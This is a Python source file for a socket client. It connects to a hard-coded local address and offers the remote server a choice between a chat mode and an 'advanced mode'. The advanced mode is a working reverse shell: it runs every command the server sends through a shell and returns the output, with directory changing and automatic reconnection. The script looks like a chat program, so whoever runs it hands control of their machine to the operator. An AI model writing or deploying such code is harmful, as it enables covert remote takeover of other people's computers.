import socket
import os
import subprocess
from threading import *


# "CONNECTED" IS USED TO CHECK IF CLIENT IS CONNECTED OR NOT
global NAME
FIRST = True
CONNECTED = True


'''======================================== THREAD RECIVE FOR NORMAL MODE ==========================================='''

# DEFINATION OF CLASS "recive"
class recive(Thread):

        def run(self):

                try:
                        def reciving():

                                # WHILE LOOP IS USED TO KEEP THE THREAD ALIVE UNTIL THE CONNECTION IS BROKEN
                                while True:

                                        # INNITIALLY "CONNECTED" IS TRUE
                                        global CONNECTED

                                        # RECIVES MESSAGES FROM SERVER ONLY IF CONNECTED
                                        if CONNECTED:
                                                msg = s.recv(1024)

                                                # CLOSES THE CONNECTION IF "msg" IS "exit"
                                                if msg.decode() == "exit":
                                                        print("host exited")
                                                        CONNECTED = False
                                                else:
                                                        print(msg.decode())

                                        # BREAK OUT OF LOOP IF NOT CONNECTED TO SERVER
                                        if not CONNECTED:
                                             break
                except:
                        if CONNECTED:
                                reciving()

                # CALL "reciving" FUNCTION ONLY IF CONNECTED TO SERVER
                if CONNECTED:
                    reciving()


# CREATING OBJECT FOR CLASS "recive"
message_in = recive()


'''========================================= THREAD SEND FOR NORMAL MODE ============================================'''

# DEFINATION OF CLASS "send"
class send(Thread):

        def run(self):

                try:
                        def sending():
                                while True:

                                        # INNITIALLY "CONNECTED" IS TRUE
                                        global CONNECTED

                                        reply = input()

                                        # CHEACKING IF CLIENT IS CONNECTED TO SERVER OR NOT
                                        if CONNECTED:

                                                # CLOSES THE CONNECTION IF "replay" IS "exit"
                                                if reply == "exit":
                                                        print("SUCCESSFULLY DIS-CONNECTED")
                                                        s.send(reply.encode())
                                                        CONNECTED = False
                                                else:
                                                        reply = NAME + ">> " + reply
                                                        s.send(reply.encode())

                                        # BREAK OUT OF LOOP IF NOT CONNECTED TO SERVER
                                        if not CONNECTED:
                                            break
                except:
                        if CONNECTED:
                            sending()

                # CALL "sending" FUNCTION ONLY IF CONNECTED TO SERVER
                if CONNECTED:
                        sending()

# CREATING OBJECT FOR CLASS "send"
message_out = send()


'''============================================= NORMAL MODE ========================================================'''

# CLIENT WORKING IN NORMAL MODE
def normal_mode():

        global NAME
        NAME = input("Enter your name : ")
        NAME = NAME.upper()

        print("\n============================================ OPERATING IN NORMAL MODE ==========================================\n")

        # INITIATING "recive" THREAD
        message_in.start()

        # INITIATING "send" THREAD
        message_out.start()

        message_in.join()
        message_out.join()

'''============================================= ADVANCE MODE ========================================================'''

# CLIENT WORKING IN ADVANCED MODE
def advanced_mode():

        print("operating in ADVANCED MODE")
        current_WorkingDir = os.getcwd() + ">"
        s.send(str.encode(current_WorkingDir))

        while True:
                data = s.recv(1024)

                # CLOSES THE CONNECTION IF "data" IS "exit"
                if data.decode() == "exit":
                        print("host exited")
                        break

                if data[:2].decode("utf-8") == "cd":
                        os.chdir(data[3:].decode("utf-8"))

                if len(data) > 0:
                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,stderr=subprocess.PIPE)
                        output_byte = cmd.stdout.read() + cmd.stderr.read()
                        output_str = str(output_byte, "utf-8")
                        current_WorkingDir = os.getcwd() + ">"
                        s.send(str.encode(output_str + current_WorkingDir))
                        print(output_str)


'''================================================= STARTING CLIENT ================================================'''

# STARTING CONNECTION WITH THE CLIENT
if FIRST:

        def start_connection():

                try:
                        global s
                        s = socket.socket()
                        host = "192.168.43.23"
                        port = 9999

                        s.connect((host, port))
                except:
                        print("trying to connect host....")
                        start_connection()

                # "opt"  CONTAINS THE MODE OF WORKING
                opt = s.recv(1024).decode()

                # IF "opt" IS "1" INITIATE "normal mode"
                if opt == '1':
                        normal_mode()

                # IF "opt" IS "2" INITIATE "advanced mode"
                if opt == '2':
                        advanced_mode()

if FIRST:
        # INITIATING CONNECTION
        FIRST = False
        start_connection()
